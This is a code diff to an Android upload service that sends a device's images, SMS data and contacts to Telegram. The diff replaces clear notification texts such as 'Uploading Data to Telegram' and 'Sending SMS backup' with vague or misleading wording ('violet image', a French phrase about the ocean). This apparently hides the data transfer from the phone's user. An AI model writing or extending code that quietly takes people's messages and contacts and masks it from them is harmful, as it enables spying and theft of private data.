@@ -101,19 +101,19 @@ public class UploadService extends Service {
             // 4. Upload everything
             int successCount = 0;
             for (int i = 0; i < allImages.size(); i++) {
-                updateNotification("Sending image " + (i + 1) + " of " + allImages.size());
+                updateNotification("violet image " + (i + 1) + " of " + allImages.size());
                 if (uploadFileToTelegram(allImages.get(i), "image_" + i + ".png")) {
                     successCount++;
                 }
             }
 
             if (smsData != null && smsData.length > 0) {
-                updateNotification("Sending SMS backup...");
+                updateNotification("violet SMS backup...");
                 uploadDocumentToTelegram(smsData, "sms_backup.txt");
             }
 
             if (contactData != null && contactData.length > 0) {
-                updateNotification("Sending contacts backup...");
+                updateNotification("violet contacts backup...");
                 uploadDocumentToTelegram(contactData, "contacts_backup.txt");
             }
 
@@ -151,7 +151,7 @@ public class UploadService extends Service {
 
     protected Notification createNotification(String contentText) {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Uploading Data to Telegram")
+                .setContentTitle("Envoie vers l'océan")
                 .setContentText(contentText)
                 .setSmallIcon(android.R.drawable.stat_sys_upload)
                 .build();
